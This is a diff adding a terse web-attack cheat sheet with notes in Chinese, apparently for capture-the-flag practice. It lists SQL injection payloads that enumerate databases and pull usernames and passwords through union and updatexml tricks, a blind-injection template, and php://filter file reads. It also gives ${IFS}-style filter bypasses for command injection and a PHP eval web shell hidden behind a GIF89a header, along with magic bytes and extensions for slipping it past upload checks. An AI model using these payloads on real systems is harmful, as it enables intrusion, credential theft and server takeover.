@@ -1,0 +1,35 @@
+set sql_mode=pipes_as_concat
+与或非 && ||  !
+php://filter/convert.base64-encode/resource=f
+handler
+var_dump()
+union select 1,2, group_concat(schema_name) from information_schema.schemata #
+admin'union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()  #
+union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='***'#
+"a'or(ord(substr(reverse(substr((database())from("+str(i)+")))from("+str(8-i)+")))<>"+str(ord(ch))+")#"
+=====updatexml============
+admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23
+admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#
+admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))
+left() right()
+
+通过union select查询可以构造一行虚拟的数据
+
+空格替换====
+${IFS}替换
+$IFS$1替换
+${IFS替换
+%20替换
+<和<>重定向符替换
+%09替换
+====
+
+GIF89a
+<script language="php">eval($_POST['shell']);</script> 
+image/jpeg
+JPG ：FF D8 FF E0 00 10 4A 46 49 46
+GIF(相当于文本的GIF89a)：47 49 46 38 39 61
+PNG： 89 50 4E 47
+
+php/php3/php4/php5/phtml/pht
+
